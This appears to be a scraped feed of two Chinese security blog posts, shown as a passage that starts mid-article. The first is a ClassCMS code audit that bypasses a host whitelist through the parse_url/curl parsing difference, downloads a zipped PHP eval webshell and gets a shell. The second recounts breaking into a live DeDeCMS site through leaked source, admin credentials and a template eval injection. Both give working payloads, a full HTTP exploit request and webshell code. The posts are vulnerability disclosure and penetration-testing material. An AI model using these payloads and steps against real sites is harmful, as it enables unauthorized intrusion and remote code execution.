通过parse_url函数解析后在判断是否是在数组中 我们的攻击url也就是down在了这里，那么目标就是绕过这个判断然后执行接下来的curl命令 if(!isset($checkurl['host']) || !in_array($checkurl['host'],$hosts)) { Return false; } 前一个条件存在是肯定满足的，那么只需要让经过parse_url解析过的host键值和数组相等即可 这里利用php中的parse_url函数和lib_curl对url的解析差异,导致了对host的过滤失效来进行绕过 php-curl拓展解析的url host在第首个@之后 而parse_url则是最后一个@之后 所以构造处payload http://@192.168.159.1:80@classcms.com/1.zip 本地尝试绕过 &lt;?php $hosts = [&quot;classcms.com&quot;,&quot;classcms.uuu.la&quot;,&quot;classcms.com&quot;]; $url = &quot;http://@192.168.159.1:80@classcms.com/1.zip&quot;; $checkurl = parse_url($url); var_dump($checkurl); if(!isset($checkurl['host']) || !in_array($checkurl['host'],$hosts)) { echo &quot;nono!&quot;; }else{ echo &quot;success!&quot;; } ?&gt; 成功绕过 绕过之后尝试执行curl &lt;?php $hosts = [&quot;classcms.com&quot;,&quot;classcms.uuu.la&quot;,&quot;classcms.com&quot;]; $url = &quot;http://@192.168.159.1:80@classcms.com/1.zip&quot;; $checkurl = parse_url($url); //var_dump($checkurl); if(!isset($checkurl['host']) || !in_array($checkurl['host'],$hosts)) { echo &quot;nono!&quot;; }else{ echo &quot;success!&quot;; $curl=curl_init(); curl_setopt($curl,CURLOPT_URL,$url); curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,10); curl_setopt($curl,CURLOPT_TIMEOUT,300); curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,FALSE); curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,FALSE); curl_setopt($curl,CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0); curl_setopt($curl,CURLOPT_POST,1); $info=curl_exec($curl); $httpinfo=curl_getinfo($curl); var_dump($info,$httpinfo); curl_close($curl);} ?&gt; 成功执行curl完成远程下载 那么构造一个木马文件 lyy.php &lt;?php phpinfo();@eval($_POST['lyy']);?&gt; 压缩成zip文件 lyy.zip 然后构造请求包 POST /admin666?do=shop:downloadClass&amp;ajax=1 HTTP/1.1 Host: classcms Content-Length: 66 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://classcms Referer: http://classcms/admin666?do=shop:index&amp;bread=%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91&amp;action=detail&amp;classhash=classcreate Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: token_2ab421=9632c6413dde844887912fd77a75a07f; csrf_2ab421=1547308b; Connection: close classhash=test&amp;url=http://@192.168.159.1:80@classcms.com/lyy.zip&amp;csrf=1547308b 可以看到已经成功绕过那个if条件，并且执行curl下载成功（返回true） 虽然最后还是报错安装包格式错误，请重试 但是可以看到他在unzip方法处理后的if中而不是else中，说明已经成功下载并解压 而cms目录下的class.php中的unzip也很简单 function unzip($src_file, $dest_dir=false, $create_zip_name_dir=true, $overwrite=true) { if(class_exists('ZipArchive')) { $zip = new ZipArchive; if ($zip-&gt;open($src_file) === TRUE) { if(@$zip-&gt;extractTo($dest_dir)) { $zip-&gt;close(); Return true; } $zip-&gt;close(); } 。。。 } $src_file就是D:\\phpStudy\\PHPTutorial\\WWW\\ClassCMS\\cache\\shop\\89a5f4d7d35347db4dd558079c11a612.class 是curl之后产生的一个临时文件 $dest_dir就是D:\\phpStudy\\PHPTutorial\\WWW\\ClassCMS\\class\\test\\ /class/{classhash参数值}的目录 所以函数的作用就是存在ZipArchive类(php_zip拓展,默认开启)时，解压临时文件内容到/class/{classhash参数值}的目录 所以最后木马文件的访问执行payload为 http://ClassCMS/class/{classhash的值}/{上传压缩包中的木马文件}这里为http://ClassCMS/class/test/lyy.php 成功执行代码并getshell 后记 这个漏洞是php curl 和 parse_url的解析差异导致的，是2017年blackhat上orange师傅的: A New Era of SSRF 中提到的 在较新版本的curl（curl&gt;=7.54.0）中已经修复了多个@的解析问题,使用多个@会报错 由于没有找到php和curl对应版本资料（哪位大师傅知道可以告诉我），这里我测试了phpstudy上的所有php版本，下面两个已经修复 ","link":"https://liangyueliangyue.github.io/post/classcms24-dai-ma-shen-ji/"},{"title":"记一次从源码泄露到getshell","content":"记一次从源码泄露到getshell 前言： 首发于先知社区：记一次从源码泄露到getshell 此次渗透中的所有修改已经复原，且漏洞已经提交至cnvd平台 源码泄露 在一个月黑风高的夜晚，闲来无事的我又开着脚本利用hunter进行互联网站点源码的扫描 在查看备份文件扫描结果时，看到了宝贝 二话不说，访问下载得到源码！ 可以在注释信息处发现dedecms的痕迹 敏感信息泄露 获得源码的第一步当然是获取敏感信息 先尝试全局搜索（crtl+shift+f）关键词 key pwd passwd password 1.数据库信息泄露 2.后台管理员密码泄露 md5解密尝试解密，居然是一个弱口令 有了账户密码后当然是要找到后台管理地址，那么有了源码后台管理地址还不是手到擒来？ 后台RCE-&gt;getshell 源码中找到后台地址（居然改了个888） 用泄露的admin/admin888进入后台后，发现版本信息为dedecms PS1 历史漏洞 查找SP1历史漏洞都是远程代码包含漏洞，但是这个站点已经将关键文件install.php删除（源码中不存在） 抱着侥幸心里又去尝试访问l一下（说不定后来又加上了呢）确实不存在，只能继续查看其他功能点 然后也尝试测试了许多SP2的漏洞payload但均失败 继续测试其他点 继续查看发现系统设置-&gt;系统基本参数-&gt;其他选项中有模板引擎的禁用函数 但是明明没有模板引擎功能他为什么要禁用呢？ 我带着这个疑问又重新翻看源码 果然又找到模板相关文件，（说明只是功能点被隐藏，文件依旧还在） 尝试访问，成功访问到并且能够正常执行 那么就好办了，根据dedecms模板规则，后台模板写入payload，访问即可执行PHP代码 {dede:field name='source' runphp='yes'}@eval($_POST['lyy']);{/dede:field} //调用方式 [field:字段名/] 这里的关键是runphp='yes' //php代码则是简单的一句话 然后去将其他选项中的禁用函数全部删除保存 因为注入到了index.htm 所以连接webshell 的 url为首页 http://xxxxx:9890/index.php 成功getshell 本来还应该通过源码泄露得到的数据库账户密码尝试连接数据库的，但这里删shell跑路太急了就忘记了测了 ","link":"https://liangyueliangyue.github.io/post/art1/"}]}